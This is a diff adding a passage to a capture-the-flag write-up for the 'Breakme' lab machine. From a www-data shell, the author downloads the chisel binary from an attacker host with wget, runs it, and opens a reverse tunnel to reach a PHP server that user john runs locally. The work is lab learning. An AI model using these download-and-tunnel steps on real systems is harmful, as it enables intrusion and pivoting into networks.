@@ -249,3 +249,59 @@ Trying bob / angel Time: 00:00:01 <                 > (36 / 14344428)  0.00%  ET
 
 ![alt text](image-9.png)
 
++ Now we can not read file of user john so we need to priv to "john".
++ We're checking the proccess belong to user "john" and find out john running the PHP development server
+
+```bash
+www-data@Breakme:/home/john$ ps aux | grep "john"
+john         538  0.0  1.0 193800 20692 ?        Ss   00:01   0:00 /usr/bin/php -S 127.0.0.1:9999
+www-data    1000  0.0  0.0   6580   640 pts/0    S+   00:23   0:00 grep john
+```
+
++ Try access the IP 127.0.0.1:9999, we've known that this is the website possibly an entry point user "john":
+
+![alt text](image-10.png)
+
++ Now we want to investigate the page but we can not access directly. We will create a tunnel to gain access to it.
++ We use tool "chisel" to create fast tunnel over HTTP.
++ Link: "https://github.com/jpillora/chisel"
++ First, we start server mode in attack machine:
+
+```bash
+chisel server -p 5555 --reverse
+2024/10/25 12:01:38 server: Reverse tunnelling enabled
+2024/10/25 12:01:38 server: Fingerprint dS1qiacIH6r9bXGWrTdcbCSGxnAO7UISaSUaFaLAqAM=
+2024/10/25 12:01:38 server: Listening on http://0.0.0.0:5555
+2024/10/25 12:06:33 server: session#1: tun: proxy#R:9999=>9999: Listening
+```
+
++ Next we download chisel into the target machine and start client mode.
+
+```bash
+www-data@Breakme:/tmp$ wget http://10.11.101.46:8000/chisel
+--2024-10-25 01:04:37--  http://10.11.101.46:8000/chisel
+Connecting to 10.11.101.46:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9371800 (8.9M) [application/octet-stream]
+Saving to: ‘chisel’
+
+chisel              100%[===================>]   8.94M  1.48MB/s    in 6.5s    
+
+2024-10-25 01:04:44 (1.39 MB/s) - ‘chisel’ saved [9371800/9371800]
+
+www-data@Breakme:/tmp$ ls -l
+total 9156
+-rw-rw-rw- 1 www-data www-data 9371800 Oct 25 00:58 chisel
+www-data@Breakme:/tmp$ chmod +x chisel 
+<./chisel client 10.11.101.46:5555 R:9999:127.0.0.1:9999 &                       
+[1] 1106
+www-data@Breakme:/tmp$ 2024/10/25 01:06:32 client: Connecting to ws://10.11.101.46:5555
+2024/10/25 01:06:33 client: Connected (Latency 211.026767ms)
+```
+
++ Access the page http://127.0.0.1:9999/ successfull
+
+
+
+
+
